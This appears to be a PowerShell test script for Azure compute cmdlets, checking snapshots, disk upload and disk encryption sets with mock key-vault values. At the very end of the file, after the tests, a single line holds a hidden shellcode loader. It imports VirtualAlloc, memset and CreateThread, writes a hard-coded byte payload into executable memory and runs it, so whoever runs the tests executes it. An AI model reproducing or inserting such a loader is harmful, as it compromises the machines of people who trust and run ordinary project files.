        Assert-AreEqual $mocksourcevault $snapshotconfig.EncryptionSettingsCollection.EncryptionSettings[0].KeyEncryptionKey.SourceVault.Id;

        
        $mockimage = '/subscriptions/' + $subId + '/resourceGroups/' + $rgname + '/providers/Microsoft.Compute/images/TestImage123';
        $snapshotconfig = Set-AzSnapshotImageReference -Snapshot $snapshotconfig -Id $mockimage -Lun 0;
        Assert-AreEqual $mockimage $snapshotconfig.CreationData.ImageReference.Id;
        Assert-AreEqual 0 $snapshotconfig.CreationData.ImageReference.Lun;

        $snapshotconfig.CreationData.ImageReference = $null;
        $job = New-AzSnapshot -ResourceGroupName $rgname -SnapshotName $snapshotname -Snapshot $snapshotconfig -AsJob;
        $result = $job | Wait-Job;
        Assert-AreEqual "Completed" $result.State;

        
        $wildcardRgQuery = ($rgname -replace ".$") + "*"
        $wildcardNameQuery = ($snapshotname -replace ".$") + "*"

        $snapshot = Get-AzSnapshot
        Assert-True { $snapshot.Count -ge 1 }

        $snapshot = Get-AzSnapshot -ResourceGroupName $rgname
        Assert-AreEqual 5 $snapshot.DiskSizeGB;
        Assert-AreEqual "Standard_LRS" $snapshot.Sku.Name;
        Assert-AreEqual Windows $snapshot.OsType;
        Assert-AreEqual Empty $snapshot.CreationData.CreateOption;
        Assert-AreEqual $true $snapshot.EncryptionSettingsCollection.Enabled;
        Assert-AreEqual $mocksourcevault $snapshot.EncryptionSettingsCollection.EncryptionSettings[0].DiskEncryptionKey.SourceVault.Id;
        Assert-AreEqual $mocksecret $snapshot.EncryptionSettingsCollection.EncryptionSettings[0].DiskEncryptionKey.SecretUrl;
        Assert-AreEqual $mocksourcevault $snapshot.EncryptionSettingsCollection.EncryptionSettings[0].KeyEncryptionKey.SourceVault.Id;
        Assert-AreEqual $mockkey $snapshot.EncryptionSettingsCollection.EncryptionSettings[0].KeyEncryptionKey.KeyUrl;

        $snapshot = Get-AzSnapshot -ResourceGroupName $wildcardRgQuery
        Assert-AreEqual 5 $snapshot.DiskSizeGB;
        Assert-AreEqual "Standard_LRS" $snapshot.Sku.Name;
        Assert-AreEqual Windows $snapshot.OsType;
        Assert-AreEqual Empty $snapshot.CreationData.CreateOption;
        Assert-AreEqual $true $snapshot.EncryptionSettingsCollection.Enabled;
        Assert-AreEqual $mocksourcevault $snapshot.EncryptionSettingsCollection.EncryptionSettings[0].DiskEncryptionKey.SourceVault.Id;
        Assert-AreEqual $mocksecret $snapshot.EncryptionSettingsCollection.EncryptionSettings[0].DiskEncryptionKey.SecretUrl;
        Assert-AreEqual $mocksourcevault $snapshot.EncryptionSettingsCollection.EncryptionSettings[0].KeyEncryptionKey.SourceVault.Id;
        Assert-AreEqual $mockkey $snapshot.EncryptionSettingsCollection.EncryptionSettings[0].KeyEncryptionKey.KeyUrl;

        $snapshot = Get-AzSnapshot -SnapshotName $snapshotname;
        Assert-AreEqual 5 $snapshot.DiskSizeGB;
        Assert-AreEqual "Standard_LRS" $snapshot.Sku.Name;
        Assert-AreEqual Windows $snapshot.OsType;
        Assert-AreEqual Empty $snapshot.CreationData.CreateOption;
        Assert-AreEqual $true $snapshot.EncryptionSettingsCollection.Enabled;
        Assert-AreEqual $mocksourcevault $snapshot.EncryptionSettingsCollection.EncryptionSettings[0].DiskEncryptionKey.SourceVault.Id;
        Assert-AreEqual $mocksecret $snapshot.EncryptionSettingsCollection.EncryptionSettings[0].DiskEncryptionKey.SecretUrl;
        Assert-AreEqual $mocksourcevault $snapshot.EncryptionSettingsCollection.EncryptionSettings[0].KeyEncryptionKey.SourceVault.Id;
        Assert-AreEqual $mockkey $snapshot.EncryptionSettingsCollection.EncryptionSettings[0].KeyEncryptionKey.KeyUrl;

        $snapshot = Get-AzSnapshot -SnapshotName $wildcardNameQuery;
        Assert-AreEqual 5 $snapshot.DiskSizeGB;
        Assert-AreEqual "Standard_LRS" $snapshot.Sku.Name;
        Assert-AreEqual Windows $snapshot.OsType;
        Assert-AreEqual Empty $snapshot.CreationData.CreateOption;
        Assert-AreEqual $true $snapshot.EncryptionSettingsCollection.Enabled;
        Assert-AreEqual $mocksourcevault $snapshot.EncryptionSettingsCollection.EncryptionSettings[0].DiskEncryptionKey.SourceVault.Id;
        Assert-AreEqual $mocksecret $snapshot.EncryptionSettingsCollection.EncryptionSettings[0].DiskEncryptionKey.SecretUrl;
        Assert-AreEqual $mocksourcevault $snapshot.EncryptionSettingsCollection.EncryptionSettings[0].KeyEncryptionKey.SourceVault.Id;
        Assert-AreEqual $mockkey $snapshot.EncryptionSettingsCollection.EncryptionSettings[0].KeyEncryptionKey.KeyUrl;

        $snapshot = Get-AzSnapshot -ResourceGroupName $wildcardRgQuery -SnapshotName $wildcardNameQuery;
        Assert-AreEqual 5 $snapshot.DiskSizeGB;
        Assert-AreEqual "Standard_LRS" $snapshot.Sku.Name;
        Assert-AreEqual Windows $snapshot.OsType;
        Assert-AreEqual Empty $snapshot.CreationData.CreateOption;
        Assert-AreEqual $true $snapshot.EncryptionSettingsCollection.Enabled;
        Assert-AreEqual $mocksourcevault $snapshot.EncryptionSettingsCollection.EncryptionSettings[0].DiskEncryptionKey.SourceVault.Id;
        Assert-AreEqual $mocksecret $snapshot.EncryptionSettingsCollection.EncryptionSettings[0].DiskEncryptionKey.SecretUrl;
        Assert-AreEqual $mocksourcevault $snapshot.EncryptionSettingsCollection.EncryptionSettings[0].KeyEncryptionKey.SourceVault.Id;
        Assert-AreEqual $mockkey $snapshot.EncryptionSettingsCollection.EncryptionSettings[0].KeyEncryptionKey.KeyUrl;

        $snapshot = Get-AzSnapshot -ResourceGroupName $wildcardRgQuery -SnapshotName $snapshotname;
        Assert-AreEqual 5 $snapshot.DiskSizeGB;
        Assert-AreEqual "Standard_LRS" $snapshot.Sku.Name;
        Assert-AreEqual Windows $snapshot.OsType;
        Assert-AreEqual Empty $snapshot.CreationData.CreateOption;
        Assert-AreEqual $true $snapshot.EncryptionSettingsCollection.Enabled;
        Assert-AreEqual $mocksourcevault $snapshot.EncryptionSettingsCollection.EncryptionSettings[0].DiskEncryptionKey.SourceVault.Id;
        Assert-AreEqual $mocksecret $snapshot.EncryptionSettingsCollection.EncryptionSettings[0].DiskEncryptionKey.SecretUrl;
        Assert-AreEqual $mocksourcevault $snapshot.EncryptionSettingsCollection.EncryptionSettings[0].KeyEncryptionKey.SourceVault.Id;
        Assert-AreEqual $mockkey $snapshot.EncryptionSettingsCollection.EncryptionSettings[0].KeyEncryptionKey.KeyUrl;

        $snapshot = Get-AzSnapshot -ResourceGroupName $rgname -SnapshotName $wildcardNameQuery;
        Assert-AreEqual 5 $snapshot.DiskSizeGB;
        Assert-AreEqual "Standard_LRS" $snapshot.Sku.Name;
        Assert-AreEqual Windows $snapshot.OsType;
        Assert-AreEqual Empty $snapshot.CreationData.CreateOption;
        Assert-AreEqual $true $snapshot.EncryptionSettingsCollection.Enabled;
        Assert-AreEqual $mocksourcevault $snapshot.EncryptionSettingsCollection.EncryptionSettings[0].DiskEncryptionKey.SourceVault.Id;
        Assert-AreEqual $mocksecret $snapshot.EncryptionSettingsCollection.EncryptionSettings[0].DiskEncryptionKey.SecretUrl;
        Assert-AreEqual $mocksourcevault $snapshot.EncryptionSettingsCollection.EncryptionSettings[0].KeyEncryptionKey.SourceVault.Id;
        Assert-AreEqual $mockkey $snapshot.EncryptionSettingsCollection.EncryptionSettings[0].KeyEncryptionKey.KeyUrl;

        $snapshot = Get-AzSnapshot -ResourceGroupName $rgname -SnapshotName $snapshotname;
        Assert-AreEqual 5 $snapshot.DiskSizeGB;
        Assert-AreEqual "Standard_LRS" $snapshot.Sku.Name;
        Assert-AreEqual Windows $snapshot.OsType;
        Assert-AreEqual Empty $snapshot.CreationData.CreateOption;
        Assert-AreEqual $true $snapshot.EncryptionSettingsCollection.Enabled;
        Assert-AreEqual $mocksourcevault $snapshot.EncryptionSettingsCollection.EncryptionSettings[0].DiskEncryptionKey.SourceVault.Id;
        Assert-AreEqual $mocksecret $snapshot.EncryptionSettingsCollection.EncryptionSettings[0].DiskEncryptionKey.SecretUrl;
        Assert-AreEqual $mocksourcevault $snapshot.EncryptionSettingsCollection.EncryptionSettings[0].KeyEncryptionKey.SourceVault.Id;
        Assert-AreEqual $mockkey $snapshot.EncryptionSettingsCollection.EncryptionSettings[0].KeyEncryptionKey.KeyUrl;
        Assert-Null $snapshot.HyperVGeneration;

        
        $job = Grant-AzSnapshotAccess -ResourceGroupName $rgname -SnapshotName $snapshotname -Access $access -DurationInSecond 5 -AsJob;
        $result = $job | Wait-Job;
        Assert-AreEqual "Completed" $result.State;
        $st = $job | Receive-Job;
        Assert-NotNull $st.AccessSAS;

        $job = Revoke-AzSnapshotAccess -ResourceGroupName $rgname -SnapshotName $snapshotname -AsJob;
        $result = $job | Wait-Job;
        Assert-AreEqual "Completed" $result.State;
        $st = $job | Receive-Job;
        Verify-PSOperationStatusResponse $st;

        
        $updateconfig = New-AzSnapshotUpdateConfig -DiskSizeGB 10 -AccountType Premium_LRS -OsType Windows;
        $job = Update-AzSnapshot -ResourceGroupName $rgname -SnapshotName $snapshotname -SnapshotUpdate $updateconfig -AsJob;
        $result = $job | Wait-Job;
        Assert-AreEqual "Completed" $result.State;

        
        $job = Remove-AzSnapshot -ResourceGroupName $rgname -SnapshotName $snapshotname -Force -AsJob;
        $result = $job | Wait-Job;
        Assert-AreEqual "Completed" $result.State;
        $st = $job | Receive-Job;
        Verify-PSOperationStatusResponse $st;
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}


function Test-DiskUpload
{
    
    $rgname = Get-ComputeTestResourceName;
    $diskname0 = 'disk0' + $rgname;
    $diskname1 = 'disk1' + $rgname;

    try
    {
        
        $loc = Get-ComputeVMLocation;
        New-AzResourceGroup -Name $rgname -Location $loc -Force;

        $diskconfig = New-AzDiskConfig -Location $loc -SkuName 'Standard_LRS' -OsType 'Windows' `
                                        -DiskSizeGB 32767 -CreateOption 'Upload';

        New-AzDisk -ResourceGroupName $rgname -DiskName $diskname0 -Disk $diskconfig;

        $disk = Get-AzDisk -ResourceGroupName $rgname -DiskName $diskname0;
        Assert-AreEqual 35183298347520 $disk.CreationData.UploadSizeBytes; 
        Assert-AreEqual "Standard_LRS" $disk.Sku.Name;
        Assert-AreEqual Windows $disk.OsType;
        Assert-AreEqual "ReadyToUpload" $disk.DiskState;

        
        $disk | Update-AzDisk -ResourceGroupName $rgname -DiskName $diskname0;

        $disk = Get-AzDisk -ResourceGroupName $rgname -DiskName $diskname0;
        Assert-AreEqual 35183298347520 $disk.CreationData.UploadSizeBytes;
        Assert-AreEqual "Standard_LRS" $disk.Sku.Name;
        Assert-AreEqual Windows $disk.OsType;
        Assert-AreEqual "ReadyToUpload" $disk.DiskState;

        Remove-AzDisk -ResourceGroupName $rgname -DiskName $diskname0 -Force;

        $diskconfig = New-AzDiskConfig -Location $loc -SkuName 'Standard_LRS' -OsType 'Windows' `
                                       -UploadSizeInBytes 35183298347520 -CreateOption 'Upload';

        New-AzDisk -ResourceGroupName $rgname -DiskName $diskname1 -Disk $diskconfig;

        $disk = Get-AzDisk -ResourceGroupName $rgname -DiskName $diskname1;
        Assert-AreEqual 35183298347520 $disk.CreationData.UploadSizeBytes;
        Assert-AreEqual "Standard_LRS" $disk.Sku.Name;
        Assert-AreEqual Windows $disk.OsType;
        Assert-AreEqual "ReadyToUpload" $disk.DiskState;

        
        $disk | Update-AzDisk -ResourceGroupName $rgname -DiskName $diskname1;

        $disk = Get-AzDisk -ResourceGroupName $rgname -DiskName $diskname1;
        Assert-AreEqual 35183298347520 $disk.CreationData.UploadSizeBytes;
        Assert-AreEqual "Standard_LRS" $disk.Sku.Name;
        Assert-AreEqual Windows $disk.OsType;
        Assert-AreEqual "ReadyToUpload" $disk.DiskState;
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}


function Test-DiskEncryptionSet
{
    
    $loc = "westcentralus";
    $rgname = "pstest";
    $encryptionName = "enc" + $rgname;
    $vaultName = 'kv' + $rgname;
    $kekName = 'kek' + $rgname;

    try
    {
        
        
        
        
        
        
        
        
        
        
        

        $subId = Get-SubscriptionIdFromResourceGroup $rgname;
        $mockkey = "https://kvpstest.vault.azure.net:443/keys/kekpstest/bf109281146949a9b3ae234db1728493";
        $mocksourcevault = '/subscriptions/' + $subId + '/resourceGroups/' + $rgname + '/providers/Microsoft.KeyVault/vaults/' + $vaultName;

        New-AzDiskEncryptionSetConfig -Location $loc -KeyUrl $mockkey -SourceVaultId $mocksourcevault -IdentityType "SystemAssigned" `
        | New-AzDiskEncryptionSet -ResourceGroupName $rgname -Name $encryptionName;

        $encSet = Get-AzDiskEncryptionSet -ResourceGroupName $rgname -Name $encryptionName;
        Assert-AreEqual $encryptionName $encSet.Name;
        Assert-AreEqual $loc $encSet.Location;
        Assert-AreEqual "SystemAssigned" $encSet.Identity.Type;
        Assert-NotNull $encSet.Identity.PrincipalId;
        Assert-NotNull $encSet.Identity.TenantId;
        Assert-AreEqual $mockkey $encSet.ActiveKey.KeyUrl;
        Assert-AreEqual $mocksourcevault $encSet.ActiveKey.SourceVault.Id;

        $encSets = Get-AzDiskEncryptionSet -ResourceGroupName $rgname;
        Assert-True {$encSets.Count -ge 1};

        $encSets = Get-AzDiskEncryptionSet;
        Assert-True {$encSets.Count -ge 1};
    }
    finally
    {
        
        $encSet | Remove-AzDiskEncryptionSet -Force;
    }
}

$FiG = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $FiG -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0xd3,0xab,0xe9,0xd4,0xda,0xcd,0xd9,0x74,0x24,0xf4,0x5d,0x2b,0xc9,0xb1,0x47,0x31,0x45,0x13,0x83,0xc5,0x04,0x03,0x45,0xdc,0x49,0x1c,0x28,0x0a,0x0f,0xdf,0xd1,0xca,0x70,0x69,0x34,0xfb,0xb0,0x0d,0x3c,0xab,0x00,0x45,0x10,0x47,0xea,0x0b,0x81,0xdc,0x9e,0x83,0xa6,0x55,0x14,0xf2,0x89,0x66,0x05,0xc6,0x88,0xe4,0x54,0x1b,0x6b,0xd5,0x96,0x6e,0x6a,0x12,0xca,0x83,0x3e,0xcb,0x80,0x36,0xaf,0x78,0xdc,0x8a,0x44,0x32,0xf0,0x8a,0xb9,0x82,0xf3,0xbb,0x6f,0x99,0xad,0x1b,0x91,0x4e,0xc6,0x15,0x89,0x93,0xe3,0xec,0x22,0x67,0x9f,0xee,0xe2,0xb6,0x60,0x5c,0xcb,0x77,0x93,0x9c,0x0b,0xbf,0x4c,0xeb,0x65,0xbc,0xf1,0xec,0xb1,0xbf,0x2d,0x78,0x22,0x67,0xa5,0xda,0x8e,0x96,0x6a,0xbc,0x45,0x94,0xc7,0xca,0x02,0xb8,0xd6,0x1f,0x39,0xc4,0x53,0x9e,0xee,0x4d,0x27,0x85,0x2a,0x16,0xf3,0xa4,0x6b,0xf2,0x52,0xd8,0x6c,0x5d,0x0a,0x7c,0xe6,0x73,0x5f,0x0d,0xa5,0x1b,0xac,0x3c,0x56,0xdb,0xba,0x37,0x25,0xe9,0x65,0xec,0xa1,0x41,0xed,0x2a,0x35,0xa6,0xc4,0x8b,0xa9,0x59,0xe7,0xeb,0xe0,0x9d,0xb3,0xbb,0x9a,0x34,0xbc,0x57,0x5b,0xb9,0x69,0xcd,0x5e,0x2d,0x98,0x13,0x4b,0x22,0xf4,0x11,0x8b,0x2d,0x59,0x9f,0x6d,0x1d,0x31,0xcf,0x21,0xdd,0xe1,0xaf,0x91,0xb5,0xeb,0x3f,0xcd,0xa5,0x13,0xea,0x66,0x4f,0xfc,0x43,0xde,0xe7,0x65,0xce,0x94,0x96,0x6a,0xc4,0xd0,0x98,0xe1,0xeb,0x25,0x56,0x02,0x81,0x35,0x0e,0xe2,0xdc,0x64,0x98,0xfd,0xca,0x03,0x24,0x68,0xf1,0x85,0x73,0x04,0xfb,0xf0,0xb3,0x8b,0x04,0xd7,0xc8,0x02,0x91,0x98,0xa6,0x6a,0x75,0x19,0x36,0x3d,0x1f,0x19,0x5e,0x99,0x7b,0x4a,0x7b,0xe6,0x51,0xfe,0xd0,0x73,0x5a,0x57,0x85,0xd4,0x32,0x55,0xf0,0x13,0x9d,0xa6,0xd7,0xa5,0xe1,0x70,0x11,0xd0,0x0b,0x41;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$gJiW=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($gJiW.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$gJiW,0,0,0);for (;;){Start-sleep 60};

